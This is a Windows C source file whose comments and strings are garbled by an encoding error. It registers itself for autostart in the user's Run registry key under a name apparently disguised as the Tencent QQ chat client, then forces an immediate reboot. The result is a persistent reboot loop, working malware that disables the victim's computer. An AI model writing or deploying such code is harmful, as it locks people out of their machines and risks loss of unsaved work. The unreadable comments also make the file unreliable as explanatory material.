#include <stdio.h>
#include <Windows.h>

int main() {

	// ��������ע����е�λ�ã�HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

	// ��Ȩ
	HANDLE hToken;
	if (0 == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
		printf("����Ȩ��ʧ�� code:001\n");
		return 0;
	}

	// �鿴һ��Ȩ��
	LUID luid;
	if (0 == LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid)) {
		printf("�鿴Ȩ��ʧ�� code:002\n");
		return 0;
	}

	// �޸�Ȩ��
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (0 == AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		printf("����Ȩ��ʧ�� code:003\n");
		return 0;
	}

	// ע�����
	HKEY hKey;

	// ��ע���
	if (0 != RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey)) {
		printf("��ע���ʧ�ܣ�code:004");
		return 0;
	}

	// ��ȡ�Լ���·��
	TCHAR szData[260];
	GetModuleFileName(NULL, szData, 260);

	// дע���
	
	RegSetValueEx(hKey, L"��ѶQQ", 0, REG_SZ, (BYTE*)szData, 260);

	// �ر�ע���
	RegCloseKey(hKey);

	// ����
	// system("shutdown -r");

	// �ػ� ����
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);

	return 0;

	/*
	ȱ��dll�Ľ��������
	1. ѡ��release
	2. ��Ŀ-�����ԣ� ��������-��c/c++ -����������-�����п�-�����߳�
	3. ��������
	*/
}